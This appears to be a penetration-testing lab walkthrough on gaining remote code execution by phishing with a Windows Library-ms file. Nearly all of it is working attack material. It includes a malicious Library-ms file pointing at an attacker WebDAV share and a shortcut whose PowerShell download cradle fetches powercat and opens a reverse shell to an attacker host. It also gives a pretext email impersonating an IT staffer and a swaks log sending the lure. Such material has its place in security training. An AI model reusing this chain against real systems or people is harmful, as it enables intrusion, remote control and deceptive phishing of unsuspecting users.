# RCE through Phishing with Windows Library Files


---

## On local machine

1. Step) Create an local Webdav Share

```
pip3 install wsgidav
```

Once WsgiDAV is installed, we'll create an /home/saitama/webdav directory to use as the WebDAV Share that will contain the malicious .lnk file.

```
mkdir /home/saitama/webdav
```
```
touch /home/saitama/webdav/test.txt
```
```
/home/saitama/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/saitama/webdav/
```

## On target machine

Create config.Library-ms file with VSC

Paste the following malicious code inside the file.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.193</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

When we now open the Library-ms file the actual webdav share with our test.txt file is visible, which means it actually works!
We now need to utilize our malicious .lnk file on the target system.
Right Click on Desktop > New > Shortcut > In the Pathing we add the following command:

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.193:8080/powercat.ps1');powercat -c 192.168.45.193 -p 443 -e powershell"
```

Save it in automation_configuration.lnk. In order to get the files from our local kali webdav directory onto the target system, we can utilize smb in the webdav directory.

On local machine

```
impacket-smbserver test . -smb2support -username test -password test
```

On target machine

```
net use m: \\192.168.45.193\test /user:test test
copy .\config.Library-ms m:\ 
copy .\automation_configuration.lnk m:\
```

In a real-world scenario we would send the library file via email, but here we will utilize the target's smb server.

Upload the .Library-ms file into the target's smb share from our WebDAV directory.

```
cd /home/saitama/webdav
rm test.txt
smbclient //<target_ip>/share -c 'put config.Library-ms'
```

Once the user clicks on it, we should gain RCE.

```
python3 -m venv myenv
source myenv/bin/activate
pip3 install wsgidav
pip install cheroot
pip install lxml
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/saitama/webdav
```

Please note that we should create an body.txt file with the following content in order to convince the user to click on the malicious file:

```
Hello! My name is Dwight, and I'm a new member of the IT Team. 

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!
```


We can then send the mail to an user existing on the target system.

Note: It's important to use test@supermagicorg.com:test as credentials

```
swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach config.Library-ms --server 192.168.139.199 --body body.txt --header "Subject: Problems" --suppress-data
Username: test@supermagicorg.com
Password: test
=== Trying 192.168.139.199:25...
=== Connected to 192.168.139.199.
<-  220 ADMIN ESMTP
 -> EHLO kali
<-  250-ADMIN
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
<-  334 UGFzc3dvcmQ6
 -> dGVzdA==
<-  235 authenticated.
 -> MAIL FROM:<share@supermagicorg.com>
<-  250 OK
 -> RCPT TO:<dave.wizard@supermagicorg.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 24 lines sent
<-  250 Queued (1.047 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

